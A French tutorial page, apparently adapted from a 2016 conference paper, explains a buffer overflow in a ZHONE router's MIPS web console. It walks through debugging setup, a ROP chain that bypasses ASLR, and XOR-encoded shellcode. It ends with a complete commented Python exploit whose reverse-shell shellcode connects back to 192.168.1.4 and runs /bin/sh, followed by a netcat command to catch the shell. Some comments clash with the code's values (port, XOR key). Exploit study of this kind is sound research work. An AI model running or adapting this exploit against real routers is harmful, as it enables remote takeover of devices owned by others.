---
description: >-
  https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Exploiting%20Buffer%20Overflows%20on%20MIPS%20Architectures%20-%20Lyon%20Yang.pdf
---

# MISP



{% embed url="https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Exploiting%20Buffer%20Overflows%20on%20MIPS%20Architectures%20-%20Lyon%20Yang.pdf" %}

## <mark style="color:red;">Exploitation de Buffer Overflow sur Architecture MIPS</mark>

### <mark style="color:blue;">1. Introduction</mark>

Ce document explique comment exploiter une vulnérabilité de débordement de tampon (buffer overflow) sur un routeur ZHONE utilisant l'architecture MIPS.

**Vulnérabilité cible** : Console Web Administrative du routeur ZHONE\
**Déclenchement** : `GET /<7000 A's>.cgi HTTP/1.1`

***

### <mark style="color:blue;">2. Configuration du Débogage</mark>

#### <mark style="color:green;">Compilation croisée de GDBServer</mark>

```bash
# Télécharger GDB
# Compiler pour MIPS
./configure --target=mips-linux-gcc
./gdb/gdbserver/configure --host=mips-linux-gcc
```

#### Connexion au débogueur

```bash
# Sur le routeur
./gdbserver –multi 192.168.1.1:1234 &

# Sur votre machine
./gdb
target extended-remote 192.168.1.1:1234
attach <pid_httpd>
```

***

### <mark style="color:blue;">3. Analyse du Débordement</mark>

#### <mark style="color:green;">Registres MIPS importants</mark>

* **$ra** : Adresse de retour (équivalent EIP sur x86)
* **$s0-$s7** : Registres sauvegardés
* **$a0-$a3** : Arguments de fonction
* **$v0-$v1** : Valeurs de retour

#### Détermination des offsets

Utilisation des outils Metasploit :

```bash
# Génération du pattern
/usr/share/metasploit-framework/tools/pattern_create.rb 7000

# Calcul de l'offset
/usr/share/metasploit-framework/tools/pattern_offset.rb 0x43212322
```

***

### <mark style="color:blue;">4. Problèmes Spécifiques MIPS</mark>

#### <mark style="color:green;">Cache Incoherency</mark>

**Problème** : Instructions décodées dans le cache de données mais processeur lit les anciennes instructions du cache d'instructions.

**Solution** : Forcer un appel à une fonction bloquante comme `sleep()` pour vider les caches lors d'un changement de contexte.

***

### <mark style="color:blue;">5. Contournement de l'ASLR avec ROP</mark>

#### <mark style="color:green;">Stratégie ROP (Return-Oriented Programming)</mark>

Chaînage de 4 gadgets ROP :

1. **Gadget 1** : Définir `$a0 = 1` pour `sleep()`
2. **Gadget 2** : Appeler la fonction `sleep()`
3. **Gadget 3** : Sauvegarder l'adresse de la pile dans un registre
4. **Gadget 4** : Sauter à l'emplacement du shellcode

#### <mark style="color:green;">Recherche de gadgets</mark>

Plugin IDA de Craig Heffner :

```python
mipsrop.find("li $a0, 1")
mipsrop.tails()
mipsrop.stackfinders()
```

***

### <mark style="color:blue;">6. Calcul des Adresses</mark>

**Base LibC** : `0x2b259000`

#### <mark style="color:green;">Adresses des gadgets</mark>

```
1er ROP Gadget ($ra) = 0x2B2AA1C8
2ème ROP Gadget ($s3) = 0x2b27395c  
Fonction sleep ($s1) = 0x2b2a8fd0
3ème ROP Gadget = 0x2b2a0eb8
4ème ROP Gadget = 0x2b2788c0
```

***

### <mark style="color:blue;">7. Structure du Payload Final</mark>

```
5117 octets + 
Registres $s0-$s7 contrôlés +
Registre $ra (1er gadget) +
7 NOP +
2ème $s1 (4ème gadget) +
NOP +
2ème $ra (3ème gadget) +
14 NOP +
Décodeur shellcode +
Fonction fork() encodée +
Shellcode reverse shell encodé
```

**Instruction NOP MIPS** : `\x27\x70\xc0\x01` (`nor t6,t6,zero`)

***

### <mark style="color:blue;">8. Encodage du Shellcode</mark>

#### <mark style="color:green;">Caractères interdits</mark>

`0x20 0x00 0x3a 0x0a 0x3f`

#### Exemple d'encodeur XOR simple

```assembly
li $s1, 9999          # Clé XOR
la $s2, 0($sp)        # Adresse pile
lw $t2, 4($s2)        # Charger données
xor $v1, $t2, $s1     # XOR
sw $v1, 4($s2)        # Sauvegarder
```

***

### <mark style="color:blue;">9. Shellcode Fork()</mark>

**Problème** : Le shell meurt rapidement (processus de monitoring)\
**Solution** : Ajouter un `fork()` au début pour créer un processus enfant

```assembly
li $s1, -1
li $a0, 9999
li $v0, 4166    # syscall nanosleep
syscall 0x40404
li $v0, 4002    # syscall fork
syscall 0x40404
bgtz $v0, loc   # Retour à la boucle si parent
```

### Points Clés à Retenir

1. **MIPS** utilise `$ra` comme adresse de retour (non EIP)
2. **Cache incoherence** nécessite des fonctions bloquantes
3. **ROP** permet de contourner l'ASLR en chaînant des gadgets
4. **Encodage** requis pour éviter les caractères interdits
5. **Fork()** nécessaire pour maintenir le shell actif

***

## <mark style="color:red;">Explication du Script Python d'Exploitation MIPS</mark>

1\. Structure générale et imports

```python
import socket, sys, struct, urlparse, re, os
host = '192.168.1.1'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
```

**Rôle :** Création d'une socket TCP pour se connecter au serveur web du routeur.

2\. Construction du Buffer Initial

```python
nop = "\x27\x70\xc0\x01"  # Instruction NOP MIPS
buf = "A"                  # Début du buffer
buf += nop * 1279         # Remplissage jusqu'aux registres
```

**Explication :**

* `nop` = instruction "ne rien faire" en MIPS
* `buf` sera envoyé pour déclencher le buffer overflow
* Les 1279 NOP nous amènent exactement aux registres qu'on veut contrôler

3\. Contrôle des Registres MIPS (ROP Gadgets Part 1)

```python
s0 = nop                    # Registre $s0 = NOP
s1 = "\x2b\x2a\x8f\xd0"   # Adresse fonction sleep()
s2 = nop                    # Registre $s2 = NOP  
s3 = "\x2b\x27\x39\x5c"   # Adresse 2ème ROP gadget
s4 = s5 = s6 = s7 = nop    # Autres registres = NOP
ra = "\x2b\x2a\xa1\xc8"   # Adresse 1er ROP gadget
```

**Ce qui se passe :**

* Quand le buffer overflow arrive, ces valeurs écrasent les registres sauvegardés
* `$ra` (return address) pointera vers le 1er gadget ROP
* `$s1` et `$s3` contiennent les adresses des fonctions qu'on veut appeler

4\. Construction du Shellcode sur la Pile

```python
shellcode = nop * 6        # Espace pour les gadgets ROP
ra2 = "\x2b\x2a\x0e\xb8"  # 3ème ROP gadget
s1_2 = "\x2b\x27\x88\xc0" # 4ème ROP gadget

shellcode += s0_2 + s1_2 + s2_2 + ra2 + nop * 6
```

**Rôle :** Ces valeurs seront lues depuis la pile par les gadgets ROP pour continuer la chaîne d'exécution.

5\. L'Encodeur - Comment il localise les données

#### Le code de l'encodeur (sc\_encode)

```python
sc_encode=("\x3c\x11\x99\x99\x36\x31\x99\x99\x27\xb2\x03\xe8\x22\x52\xff\x0c...")
```

**Décomposition en assembleur MIPS :**

```assembly
# Charger la clé XOR (99999999 = 0x5F5E0FF en hex)
li $s1, 2576980377     # \x3c\x11\x99\x99\x36\x31\x99\x99

# Calculer l'adresse où sont les données à décoder
la $s2, 1000($sp)      # \x27\xb2\x03\xe8 
addi $s2, $s2, -244    # \x22\x52\xff\x0c

# Charger les données encodées
lw $t2, -500($s2)      # \x8e\x4a\xfe\x0c

# Les décoder (XOR)
xor $v1, $t2, $s1      # \x01\x51\x18\x26

# Les réécrire décodées
sw $v1, -500($s2)      # \xae\x43\xfe\x0c
```

#### Comment il localise précisément les données

**Calcul d'adresse :**

1. `$sp` = pointeur de pile actuel
2. `$sp + 1000 - 244 - 500` = position exacte des données encodées
3. Cette position correspond exactement à `sc_fork_bad` et `sc_bad1/sc_bad2`

**Positions calculées :**

```python
# Position 24 dans le shellcode final
# at position: (15*6 + 6) /4 = 24
sc_bad1=("\x9b\xb9\x11\xbe")  # Encodé

# Position 24 + 2 = 26
sc_bad2=("\x9b\xb9\xb1\xb8")  # Encodé
```

6\. Assemblage du Shellcode Final

```python
sc = sc_encode      # 1. L'encodeur (s'exécute en premier)
sc += sc_fork1      # 2. Début du fork()
sc += sc_fork_bad   # 3. Données encodées à décoder
sc += sc_fork2      # 4. Fin du fork()
sc += sc_first      # 5. Début reverse shell
sc += sc_bad1       # 6. 1ère donnée encodée
sc += sc_mid        # 7. Milieu reverse shell  
sc += sc_bad2       # 8. 2ème donnée encodée
sc += sc_last       # 9. Fin reverse shell
```

7\. Séquence d'Exécution sur le Routeur

#### Ordre chronologique :

1. **Buffer Overflow** → Registres écrasés
2. **1er ROP Gadget** (`ra`) → Met `$a0 = 1`
3. **2ème ROP Gadget** (`$s3`) → Appelle `sleep(1)`
4. **Sleep** → Vide les caches (cache coherency)
5. **3ème ROP Gadget** → Calcule adresse pile
6. **4ème ROP Gadget** → Saute vers `sc_encode`
7. **Encodeur s'exécute** :
   * Localise `sc_fork_bad` à `$sp+256` (approximativement)
   * XOR `\x87\xb9\x66\x65` → `\x1E\x20\xFF\xFC`
   * Localise `sc_bad1` et le décode
   * Localise `sc_bad2` et le décode
8. **Fork()** s'exécute avec les vraies instructions
9. **Reverse shell** s'exécute avec les vraies instructions

8\. Calcul Précis des Positions

```python
# L'encodeur sait où chercher car :
# 1. Il connaît sa position sur la pile ($sp)
# 2. Il calcule des offsets fixes :
#    - sc_fork_bad est à +X octets de sc_encode
#    - sc_bad1 est à +Y octets de sc_encode  
#    - sc_bad2 est à +Z octets de sc_encode

# Les offsets sont calculés à la compilation :
# Position = adresse_base + offset_connu
```

{% code fullWidth="true" %}
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Exploit Buffer Overflow MIPS - Routeur ZHONE
Auteur: Lyon Yang (2016) - Adapté avec commentaires détaillés

Ce script exploite une vulnérabilité de buffer overflow dans le serveur web
d'un routeur ZHONE utilisant l'architecture MIPS.
"""

import socket
import sys
import struct
import urlparse
import re
import os

# =============================================================================
# CONFIGURATION DE BASE
# =============================================================================

# Adresse IP du routeur cible
host = '192.168.1.1'

# Création d'une socket TCP pour la connexion HTTP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# =============================================================================
# DÉFINITION DES CONSTANTES MIPS
# =============================================================================

# Instruction NOP pour MIPS : "nor t6,t6,zero"
# Cette instruction ne fait rien, utilisée pour le padding
nop = "\x27\x70\xc0\x01"

# =============================================================================
# CONSTRUCTION DU BUFFER INITIAL POUR LE OVERFLOW
# =============================================================================

# Début du buffer avec un caractère 'A'
buf = "A"

# Ajout de 1279 instructions NOP pour atteindre exactement les registres
# Cette taille a été calculée par fuzzing/debugging avec GDB
buf += nop * 1279

# =============================================================================
# CONFIGURATION DES GADGETS ROP - PARTIE 1
# Contrôle des registres MIPS lors du retour de fonction
# =============================================================================

print("[*] Configuration des registres pour les gadgets ROP...")

# Registre $s0 : mis à NOP (pas utilisé directement)
s0 = nop

# Registre $s1 : Adresse de la fonction sleep() dans LibC
# Base LibC (0x2b259000) + Offset sleep (0x4FFD0) = 0x2b2a8fd0
s1 = "\x2b\x2a\x8f\xd0"
print("[+] $s1 = Adresse sleep(): 0x2b2a8fd0")

# Registre $s2 : mis à NOP
s2 = nop

# Registre $s3 : Adresse du 2ème gadget ROP
# Base LibC (0x2b259000) + Offset gadget (0x1A95C) = 0x2b27395c
s3 = "\x2b\x27\x39\x5c"
print("[+] $s3 = Adresse 2ème ROP gadget: 0x2b27395c")

# Registres $s4 à $s7 : mis à NOP (non utilisés)
s4 = nop
s5 = nop
s6 = nop
s7 = nop

# Registre $ra (Return Address) : Adresse du 1er gadget ROP
# C'est ici que commence notre chaîne ROP
# Base LibC (0x2b259000) + Offset gadget (0x511C8) = 0x2B2AA1C8
ra = "\x2b\x2a\xa1\xc8"
print("[+] $ra = Adresse 1er ROP gadget: 0x2B2AA1C8")

# =============================================================================
# CONSTRUCTION DU SHELLCODE SUR LA PILE
# =============================================================================

print("[*] Construction du shellcode sur la pile...")

# Début du shellcode avec 6 instructions NOP pour l'alignement
shellcode = nop * 6

# =============================================================================
# GADGETS ROP - PARTIE 2 (stockés sur la pile)
# =============================================================================

# 3ème gadget ROP : sera utilisé comme nouvelle adresse de retour
# Base LibC (0x2b259000) + Offset gadget (0x47EB8) = 0x2b2a0eb8
ra2 = "\x2b\x2a\x0e\xb8"
print("[+] 3ème ROP gadget: 0x2b2a0eb8")

# Registres pour la suite de la chaîne ROP
s0_2 = nop

# 4ème gadget ROP : sautera vers notre shellcode
# Base LibC (0x2b259000) + Offset gadget (0x1f8c0) = 0x2b2788c0
s1_2 = "\x2b\x27\x88\xc0"
print("[+] 4ème ROP gadget: 0x2b2788c0")

s2_2 = nop

# Assemblage des données sur la pile dans l'ordre attendu par les gadgets
shellcode += s0_2    # Sera lu par le gadget
shellcode += s1_2    # Adresse du 4ème gadget
shellcode += s2_2    # Padding
shellcode += ra2     # Adresse du 3ème gadget
shellcode += nop * 6 # Alignement supplémentaire

# =============================================================================
# SHELLCODE - ENCODEUR XOR
# =============================================================================

print("[*] Ajout de l'encodeur XOR...")

# Cet encodeur s'exécutera en PREMIER pour décoder les "bad characters"
# Il utilise XOR avec la clé 99999999 (0x5F5E0FF)
sc_encode = (
    "\x3c\x11\x99\x99"  # lui $s1, 0x9999         ; Charger partie haute de la clé
    "\x36\x31\x99\x99"  # ori $s1, $s1, 0x9999    ; Compléter la clé XOR
    "\x27\xb2\x03\xe8"  # addiu $s2, $sp, 0x3e8   ; $s2 = $sp + 1000
    "\x22\x52\xff\x0c"  # addi $s2, $s2, -244     ; Ajuster l'adresse
    "\x8e\x4a\xfe\x0c"  # lw $t2, -500($s2)       ; Charger 1ères données encodées
    "\x01\x51\x18\x26"  # xor $v1, $t2, $s1       ; Décoder avec XOR
    "\xae\x43\xfe\x0c"  # sw $v1, -500($s2)       ; Réécrire décodées
    "\x22\x52\xff\xf8"  # addi $s2, $s2, -8       ; Passer aux données suivantes
    "\x8e\x4a\xfe\x0c"  # lw $t2, -500($s2)       ; Charger 2èmes données
    "\x01\x51\x18\x26"  # xor $v1, $t2, $s1       ; Décoder
    "\xae\x43\xfe\x0c"  # sw $v1, -500($s2)       ; Réécrire
    "\x22\x52\xff\x90"  # addi $s2, $s2, -144     ; Passer aux 3èmes données
    "\x8e\x4a\xfe\x0c"  # lw $t2, -500($s2)       ; Charger
    "\x01\x51\x18\x26"  # xor $v1, $t2, $s1       ; Décoder
    "\xae\x43\xfe\x0c"  # sw $v1, -500($s2)       ; Réécrire
)

print("[+] Encodeur XOR ajouté (clé: 99999999)")

# =============================================================================
# SHELLCODE - FONCTION FORK()
# =============================================================================

print("[*] Ajout du shellcode fork()...")

# Première partie du fork() - configuration initiale
sc_fork1 = (
    "\x24\x11\xFF\xFF"  # li $s1, -1              ; $s1 = -1 pour la boucle
    "\x24\x04\x27\x0F"  # li $a0, 9999            ; Argument pour nanosleep
    "\x24\x02\x10\x46"  # li $v0, 4166            ; Syscall nanosleep
    "\x01\x01\x01\x0C"  # syscall 0x40404         ; Appel système
)

# Données encodées du fork (bad characters)
# Original: "\x1E\x20\xFF\xFC" → Encodé avec XOR 99999999
sc_fork_bad = "\x87\xb9\x66\x65"
print("[+] Données fork encodées: bad characters évités")

# Deuxième partie du fork() - appel système fork
sc_fork2 = (
    "\x24\x11\x10\x2D"  # li $s1, 4141            ; Nouvelle valeur pour $s1
    "\x24\x02\x0F\xA2"  # li $v0, 4002            ; Syscall fork
    "\x01\x01\x01\x0C"  # syscall 0x40404         ; Appel système fork
    "\x1C\x40\xFF\xF8"  # bgtz $v0, loc           ; Si parent, retour boucle
)

# =============================================================================
# SHELLCODE - REVERSE SHELL
# =============================================================================

print("[*] Ajout du shellcode reverse shell...")

# Première partie du reverse shell - configuration socket
sc_first = (
    "\x24\x0f\xff\xfa"  # li $t7, -6              ; Configuration socket
    "\x01\xe0\x78\x27"  # nor $t7, $t7, $zero     ; $t7 = 5 (AF_INET)
    "\x21\xe4\xff\xfd"  # addi $a0, $t7, -3       ; $a0 = 2 (AF_INET)
    "\x21\xe5\xff\xfd"  # addi $a1, $t7, -3       ; $a1 = 1 (SOCK_STREAM)
    "\x28\x06\xff\xff"  # slti $a2, $zero, -1     ; $a2 = 0 (protocol)
    "\x24\x02\x10\x57"  # li $v0, 4183            ; Syscall socket
    "\x01\x01\x01\x0c"  # syscall 0x40404         ; Créer socket
    "\xaf\xa2\xff\xff"  # sw $v0, -1($sp)         ; Sauver fd socket
    "\x8f\xa4\xff\xff"  # lw $a0, -1($sp)         ; Charger fd socket
    "\x34\x0f\xff\xfd"  # ori $t7, $zero, 0xfffd  ; Configuration
    "\x01\xe0\x78\x27"  # nor $t7, $t7, $zero     ; $t7 = 2
    "\xaf\xaf\xff\xe0"  # sw $t7, -32($sp)        ; sin_family = AF_INET
    "\x3c\x0e"          # lui $t6, port_high      ; Charger partie haute du port
)

# Numéro de port (31337 = 0x7A69)
sc_first += "\x30\x3B"  # Port 12347 en little-endian
print("[+] Port configuré: 12347")

sc_first += (
    "\x35\xce\x7a\x69"  # ori $t6, $t6, 0x7a69    ; Port complet
    "\xaf\xae\xff\xe4"  # sw $t6, -28($sp)        ; sin_port
    "\x3c\x0e\xc0\xa8"  # lui $t6, 0xc0a8         ; IP 192.168.x.x
    "\x35\xce\x01"      # ori $t6, $t6, 0x01xx    ; Compléter IP
)

# Dernier octet de l'IP (modifiable)
sc_first += "\x04"  # IP: 192.168.1.4
print("[+] IP configurée: 192.168.1.4")

sc_first += (
    "\xaf\xae\xff\xe6"  # sw $t6, -26($sp)        ; sin_addr
    "\x27\xa5\xff\xe2"  # addiu $a1, $sp, -30     ; &sockaddr
    "\x24\x0c\xff\xef"  # li $t4, -17             ; Configuration
    "\x01\x80\x30\x27"  # nor $a2, $t4, $zero     ; $a2 = 16 (sizeof sockaddr)
    "\x24\x02\x10\x4a"  # li $v0, 4170            ; Syscall connect
    "\x01\x01\x01\x0c"  # syscall 0x40404         ; Se connecter
    "\x24\x11\xff\xfd"  # li $s1, -3              ; Configuration dup2
)

# Position calculée pour les bad characters dans le reverse shell
# Position: (15*6 + 6) /4 = 24 mots de 32 bits depuis le début
print("[+] Position des bad characters calculée: offset 24")

# Première donnée encodée du reverse shell
# Original: "\x02\x20\x88\x27" → Encodé avec XOR 99999999
sc_bad1 = "\x9b\xb9\x11\xbe"

# Partie intermédiaire du reverse shell
sc_mid = "\x8f\xa4\xff\xff"  # lw $a0, -1($sp) ; Charger fd socket

# Deuxième donnée encodée
# Original: "\x02\x20\x28\x21" → Encodé avec XOR 99999999  
sc_bad2 = "\x9b\xb9\xb1\xb8"

# Dernière partie du reverse shell - duplication des descripteurs et exec
sc_last = (
    "\x24\x02\x0f\xdf"  # li $v0, 4063            ; Syscall dup2
    "\x01\x01\x01\x0c"  # syscall 0x40404         ; dup2(socket, i)
    "\x24\x10\xff\xff"  # li $s0, -1              ; Compteur
    "\x22\x31\xff\xff"  # addi $s1, $s1, -1       ; Décrémenter
    "\x16\x30\xff\xfa"  # bne $s1, $s0, loop      ; Boucle pour stdin/stdout/stderr
    "\x28\x06\xff\xff"  # slti $a2, $zero, -1     ; $a2 = 0
    "\x3c\x0f\x2f\x2f"  # lui $t7, 0x2f2f         ; "/"
    "\x35\xef\x62\x69"  # ori $t7, $t7, 0x6269    ; "/bin"
    "\xaf\xaf\xff\xec"  # sw $t7, -20($sp)        ; Stocker "/bin"
    "\x3c\x0e\x6e\x2f"  # lui $t6, 0x6e2f         ; "n/"
    "\x35\xce\x73\x68"  # ori $t6, $t6, 0x7368    ; "sh"
    "\xaf\xae\xff\xf0"  # sw $t6, -16($sp)        ; Stocker "/sh"
    "\xaf\xa0\xff\xf4"  # sw $zero, -12($sp)      ; Null terminator
    "\x27\xa4\xff\xec"  # addiu $a0, $sp, -20     ; argv[0] = "/bin/sh"
    "\xaf\xa4\xff\xf8"  # sw $a0, -8($sp)         ; argv[0]
    "\xaf\xa0\xff\xfc"  # sw $zero, -4($sp)       ; argv[1] = NULL
    "\x27\xa5\xff\xf8"  # addiu $a1, $sp, -8      ; argv
    "\x24\x02\x0f\xab"  # li $v0, 4011            ; Syscall execve
    "\x01\x01\x01\x0c"  # syscall 0x40404         ; execve("/bin/sh", argv, NULL)
)

print("[+] Reverse shell configuré pour /bin/sh")

# =============================================================================
# ASSEMBLAGE FINAL DU SHELLCODE
# =============================================================================

print("[*] Assemblage du shellcode final...")

# Ordre d'exécution:
# 1. sc_encode    - Décode les bad characters
# 2. sc_fork1     - Première partie fork
# 3. sc_fork_bad  - Données fork encodées (seront décodées)
# 4. sc_fork2     - Deuxième partie fork
# 5. sc_first     - Début reverse shell
# 6. sc_bad1      - 1ère donnée encodée reverse shell
# 7. sc_mid       - Milieu reverse shell
# 8. sc_bad2      - 2ème donnée encodée reverse shell
# 9. sc_last      - Fin reverse shell

sc = sc_encode
sc += sc_fork1
sc += sc_fork_bad
sc += sc_fork2
sc += sc_first
sc += sc_bad1
sc += sc_mid
sc += sc_bad2
sc += sc_last

print("[+] Shellcode assemblé - Taille: {} octets".format(len(sc)))

# Ajout du shellcode au payload avec padding
shellcode += nop * 8  # Alignement avant le shellcode
shellcode += sc       # Le shellcode complet

# Calcul du padding final pour atteindre la taille exacte requise
# Taille totale cible: 1852 octets
# Moins: 24 (gadgets ROP) + 8 (NOP avant) + 8 (NOP après) + 18 (divers)
padding_size = (1852 - 24 - 8 - 8 - 18 - len(sc)) / 4
shellcode += nop * int(padding_size)

print("[+] Padding final ajouté: {} instructions NOP".format(int(padding_size)))

# =============================================================================
# ENVOI DE L'EXPLOIT
# =============================================================================

print("[*] Connexion au routeur cible...")
s.connect((host, 80))

print("[*] Envoi de l'exploit...")

# Construction de la requête HTTP malveillante
# GET /.html[BUFFER_OVERFLOW].html HTTP/1.1

s.send("GET /.html")           # Début URL
s.send(buf)                    # Buffer overflow principal

# Envoi des valeurs pour contrôler les registres MIPS
s.send(s0)    # Registre $s0
s.send(s1)    # Registre $s1 (adresse sleep)
s.send(s2)    # Registre $s2  
s.send(s3)    # Registre $s3 (2ème gadget ROP)
s.send(s4)    # Registre $s4
s.send(s5)    # Registre $s5
s.send(s6)    # Registre $s6
s.send(s7)    # Registre $s7
s.send(ra)    # Registre $ra (1er gadget ROP) - Point d'entrée !

s.send(shellcode)              # Notre shellcode complet

# Fin de l'URL et headers HTTP normaux
s.send(".html HTTP/1.1\n")
s.send("Host: 192.168.1.1\n")
s.send("User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0\n")
s.send("Accept: */*\n")
s.send("Accept-Language: en-US,en;q=0.5\n") 
s.send("Accept-Encoding: gzip, deflate\n")
s.send("Referer: http://132.147.82.80/\n")
s.send("Authorization: Basic <Encoded password>\n")
s.send("Connection: keep-alive\n\n")

print("[+] Exploit envoyé !")

# =============================================================================
# RÉCEPTION DE LA RÉPONSE
# =============================================================================

print("[*] Attente de la réponse...")
try:
    data = s.recv(1000000)
    print("[+] Réponse reçue:")
    print(data)
except:
    print("[!] Pas de réponse (normal si l'exploit fonctionne)")

s.close()
print("[*] Connexion fermée")
print("[*] Si l'exploit fonctionne, connectez-vous avec: nc 192.168.1.4 12347")
```
{% endcode %}
